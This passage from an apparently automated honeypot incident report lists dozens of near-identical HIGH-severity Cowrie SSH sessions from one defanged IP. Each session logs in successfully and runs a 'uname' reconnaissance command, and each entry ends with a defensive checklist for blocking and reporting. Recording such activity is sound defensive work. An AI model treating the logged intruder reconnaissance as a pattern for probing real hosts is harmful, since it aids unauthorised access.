| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:17` | `cowrie.session.connect` |
| `2026-07-04 15:00:17` | `cowrie.client.version` |
| `2026-07-04 15:00:17` | `cowrie.client.kex` |
| `2026-07-04 15:00:18` | `cowrie.login.success` |
| `2026-07-04 15:00:18` | `cowrie.session.params` |
| `2026-07-04 15:00:18` | `cowrie.command.input` |
| `2026-07-04 15:00:19` | `cowrie.log.closed` |
| `2026-07-04 15:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f9d38f1ad2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:21` | `cowrie.session.connect` |
| `2026-07-04 15:00:21` | `cowrie.client.version` |
| `2026-07-04 15:00:21` | `cowrie.client.kex` |
| `2026-07-04 15:00:21` | `cowrie.login.success` |
| `2026-07-04 15:00:22` | `cowrie.session.params` |
| `2026-07-04 15:00:22` | `cowrie.command.input` |
| `2026-07-04 15:00:22` | `cowrie.log.closed` |
| `2026-07-04 15:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a04cf7bc32

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:24` | `cowrie.session.connect` |
| `2026-07-04 15:00:24` | `cowrie.client.version` |
| `2026-07-04 15:00:24` | `cowrie.client.kex` |
| `2026-07-04 15:00:24` | `cowrie.login.success` |
| `2026-07-04 15:00:25` | `cowrie.session.params` |
| `2026-07-04 15:00:25` | `cowrie.command.input` |
| `2026-07-04 15:00:25` | `cowrie.log.closed` |
| `2026-07-04 15:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78584911f46e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:27` | `cowrie.session.connect` |
| `2026-07-04 15:00:27` | `cowrie.client.version` |
| `2026-07-04 15:00:27` | `cowrie.client.kex` |
| `2026-07-04 15:00:28` | `cowrie.login.success` |
| `2026-07-04 15:00:29` | `cowrie.session.params` |
| `2026-07-04 15:00:29` | `cowrie.command.input` |
| `2026-07-04 15:00:29` | `cowrie.log.closed` |
| `2026-07-04 15:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b9163f075e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:31` | `cowrie.session.connect` |
| `2026-07-04 15:00:31` | `cowrie.client.version` |
| `2026-07-04 15:00:31` | `cowrie.client.kex` |
| `2026-07-04 15:00:31` | `cowrie.login.success` |
| `2026-07-04 15:00:32` | `cowrie.session.params` |
| `2026-07-04 15:00:32` | `cowrie.command.input` |
| `2026-07-04 15:00:32` | `cowrie.log.closed` |
| `2026-07-04 15:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88712ee05148

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:34` | `cowrie.session.connect` |
| `2026-07-04 15:00:34` | `cowrie.client.version` |
| `2026-07-04 15:00:34` | `cowrie.client.kex` |
| `2026-07-04 15:00:35` | `cowrie.login.success` |
| `2026-07-04 15:00:35` | `cowrie.session.params` |
| `2026-07-04 15:00:35` | `cowrie.command.input` |
| `2026-07-04 15:00:36` | `cowrie.log.closed` |
| `2026-07-04 15:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8bd347ff33

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:37` | `cowrie.session.connect` |
| `2026-07-04 15:00:37` | `cowrie.client.version` |
| `2026-07-04 15:00:38` | `cowrie.client.kex` |
| `2026-07-04 15:00:38` | `cowrie.login.success` |
| `2026-07-04 15:00:39` | `cowrie.session.params` |
| `2026-07-04 15:00:39` | `cowrie.command.input` |
| `2026-07-04 15:00:39` | `cowrie.log.closed` |
| `2026-07-04 15:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b927f40fadc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:41` | `cowrie.session.connect` |
| `2026-07-04 15:00:41` | `cowrie.client.version` |
| `2026-07-04 15:00:41` | `cowrie.client.kex` |
| `2026-07-04 15:00:41` | `cowrie.login.success` |
| `2026-07-04 15:00:42` | `cowrie.session.params` |
| `2026-07-04 15:00:42` | `cowrie.command.input` |
| `2026-07-04 15:00:42` | `cowrie.log.closed` |
| `2026-07-04 15:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-898659c1d344

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:44` | `cowrie.session.connect` |
| `2026-07-04 15:00:44` | `cowrie.client.version` |
| `2026-07-04 15:00:44` | `cowrie.client.kex` |
| `2026-07-04 15:00:45` | `cowrie.login.success` |
| `2026-07-04 15:00:46` | `cowrie.session.params` |
| `2026-07-04 15:00:46` | `cowrie.command.input` |
| `2026-07-04 15:00:46` | `cowrie.log.closed` |
| `2026-07-04 15:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff4e461f9860

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:48` | `cowrie.session.connect` |
| `2026-07-04 15:00:48` | `cowrie.client.version` |
| `2026-07-04 15:00:48` | `cowrie.client.kex` |
| `2026-07-04 15:00:48` | `cowrie.login.success` |
| `2026-07-04 15:00:49` | `cowrie.session.params` |
| `2026-07-04 15:00:49` | `cowrie.command.input` |
| `2026-07-04 15:00:49` | `cowrie.log.closed` |
| `2026-07-04 15:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e1de94e326b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:51` | `cowrie.session.connect` |
| `2026-07-04 15:00:51` | `cowrie.client.version` |
| `2026-07-04 15:00:51` | `cowrie.client.kex` |
| `2026-07-04 15:00:52` | `cowrie.login.success` |
| `2026-07-04 15:00:53` | `cowrie.session.params` |
| `2026-07-04 15:00:53` | `cowrie.command.input` |
| `2026-07-04 15:00:53` | `cowrie.log.closed` |
| `2026-07-04 15:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-863e39f8858f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:55` | `cowrie.session.connect` |
| `2026-07-04 15:00:55` | `cowrie.client.version` |
| `2026-07-04 15:00:55` | `cowrie.client.kex` |
| `2026-07-04 15:00:55` | `cowrie.login.success` |
| `2026-07-04 15:00:56` | `cowrie.session.params` |
| `2026-07-04 15:00:56` | `cowrie.command.input` |
| `2026-07-04 15:00:56` | `cowrie.log.closed` |
| `2026-07-04 15:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-854d533b26a3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:00 |
| **Last Seen** | 2026-07-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:00:58` | `cowrie.session.connect` |
| `2026-07-04 15:00:58` | `cowrie.client.version` |
| `2026-07-04 15:00:58` | `cowrie.client.kex` |
| `2026-07-04 15:00:58` | `cowrie.login.success` |
| `2026-07-04 15:00:59` | `cowrie.session.params` |
| `2026-07-04 15:00:59` | `cowrie.command.input` |
| `2026-07-04 15:00:59` | `cowrie.log.closed` |
| `2026-07-04 15:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb43d5c83c23

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:01` | `cowrie.session.connect` |
| `2026-07-04 15:01:01` | `cowrie.client.version` |
| `2026-07-04 15:01:01` | `cowrie.client.kex` |
| `2026-07-04 15:01:02` | `cowrie.login.success` |
| `2026-07-04 15:01:03` | `cowrie.session.params` |
| `2026-07-04 15:01:03` | `cowrie.command.input` |
| `2026-07-04 15:01:03` | `cowrie.log.closed` |
| `2026-07-04 15:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d8d3de3a477

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:05` | `cowrie.session.connect` |
| `2026-07-04 15:01:05` | `cowrie.client.version` |
| `2026-07-04 15:01:05` | `cowrie.client.kex` |
| `2026-07-04 15:01:05` | `cowrie.login.success` |
| `2026-07-04 15:01:06` | `cowrie.session.params` |
| `2026-07-04 15:01:06` | `cowrie.command.input` |
| `2026-07-04 15:01:06` | `cowrie.log.closed` |
| `2026-07-04 15:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-146602035cc6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:08` | `cowrie.session.connect` |
| `2026-07-04 15:01:08` | `cowrie.client.version` |
| `2026-07-04 15:01:08` | `cowrie.client.kex` |
| `2026-07-04 15:01:08` | `cowrie.login.success` |
| `2026-07-04 15:01:09` | `cowrie.session.params` |
| `2026-07-04 15:01:09` | `cowrie.command.input` |
| `2026-07-04 15:01:09` | `cowrie.log.closed` |
| `2026-07-04 15:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb9665c80fff

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:11` | `cowrie.session.connect` |
| `2026-07-04 15:01:11` | `cowrie.client.version` |
| `2026-07-04 15:01:11` | `cowrie.client.kex` |
| `2026-07-04 15:01:12` | `cowrie.login.success` |
| `2026-07-04 15:01:12` | `cowrie.session.params` |
| `2026-07-04 15:01:12` | `cowrie.command.input` |
| `2026-07-04 15:01:12` | `cowrie.log.closed` |
| `2026-07-04 15:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a244ce9dafd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:15` | `cowrie.session.connect` |
| `2026-07-04 15:01:15` | `cowrie.client.version` |
| `2026-07-04 15:01:15` | `cowrie.client.kex` |
| `2026-07-04 15:01:15` | `cowrie.login.success` |
| `2026-07-04 15:01:16` | `cowrie.session.params` |
| `2026-07-04 15:01:16` | `cowrie.command.input` |
| `2026-07-04 15:01:16` | `cowrie.log.closed` |
| `2026-07-04 15:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d96b103800

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:18` | `cowrie.session.connect` |
| `2026-07-04 15:01:18` | `cowrie.client.version` |
| `2026-07-04 15:01:18` | `cowrie.client.kex` |
| `2026-07-04 15:01:18` | `cowrie.login.success` |
| `2026-07-04 15:01:19` | `cowrie.session.params` |
| `2026-07-04 15:01:19` | `cowrie.command.input` |
| `2026-07-04 15:01:19` | `cowrie.log.closed` |
| `2026-07-04 15:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fb019477868

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:21` | `cowrie.session.connect` |
| `2026-07-04 15:01:21` | `cowrie.client.version` |
| `2026-07-04 15:01:21` | `cowrie.client.kex` |
| `2026-07-04 15:01:22` | `cowrie.login.success` |
| `2026-07-04 15:01:23` | `cowrie.session.params` |
| `2026-07-04 15:01:23` | `cowrie.command.input` |
| `2026-07-04 15:01:23` | `cowrie.log.closed` |
| `2026-07-04 15:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9a653765726

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:25` | `cowrie.session.connect` |
| `2026-07-04 15:01:25` | `cowrie.client.version` |
| `2026-07-04 15:01:25` | `cowrie.client.kex` |
| `2026-07-04 15:01:25` | `cowrie.login.success` |
| `2026-07-04 15:01:26` | `cowrie.session.params` |
| `2026-07-04 15:01:26` | `cowrie.command.input` |
| `2026-07-04 15:01:26` | `cowrie.log.closed` |
| `2026-07-04 15:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1fc229b82ad

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:28` | `cowrie.session.connect` |
| `2026-07-04 15:01:28` | `cowrie.client.version` |
| `2026-07-04 15:01:28` | `cowrie.client.kex` |
| `2026-07-04 15:01:29` | `cowrie.login.success` |
| `2026-07-04 15:01:30` | `cowrie.session.params` |
| `2026-07-04 15:01:30` | `cowrie.command.input` |
| `2026-07-04 15:01:30` | `cowrie.log.closed` |
| `2026-07-04 15:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcb61b52c050

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:32` | `cowrie.session.connect` |
| `2026-07-04 15:01:32` | `cowrie.client.version` |
| `2026-07-04 15:01:32` | `cowrie.client.kex` |
| `2026-07-04 15:01:32` | `cowrie.login.success` |
| `2026-07-04 15:01:33` | `cowrie.session.params` |
| `2026-07-04 15:01:33` | `cowrie.command.input` |
| `2026-07-04 15:01:33` | `cowrie.log.closed` |
| `2026-07-04 15:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a58c5409edc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:35` | `cowrie.session.connect` |
| `2026-07-04 15:01:35` | `cowrie.client.version` |
| `2026-07-04 15:01:35` | `cowrie.client.kex` |
| `2026-07-04 15:01:35` | `cowrie.login.success` |
| `2026-07-04 15:01:36` | `cowrie.session.params` |
| `2026-07-04 15:01:36` | `cowrie.command.input` |
| `2026-07-04 15:01:36` | `cowrie.log.closed` |
| `2026-07-04 15:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09d1ad6dc806

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:38` | `cowrie.session.connect` |
| `2026-07-04 15:01:38` | `cowrie.client.version` |
| `2026-07-04 15:01:38` | `cowrie.client.kex` |
| `2026-07-04 15:01:39` | `cowrie.login.success` |
| `2026-07-04 15:01:40` | `cowrie.session.params` |
| `2026-07-04 15:01:40` | `cowrie.command.input` |
| `2026-07-04 15:01:40` | `cowrie.log.closed` |
| `2026-07-04 15:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb55a31b0024

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:42` | `cowrie.session.connect` |
| `2026-07-04 15:01:42` | `cowrie.client.version` |
| `2026-07-04 15:01:42` | `cowrie.client.kex` |
| `2026-07-04 15:01:42` | `cowrie.login.success` |
| `2026-07-04 15:01:43` | `cowrie.session.params` |
| `2026-07-04 15:01:43` | `cowrie.command.input` |
| `2026-07-04 15:01:43` | `cowrie.log.closed` |
| `2026-07-04 15:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
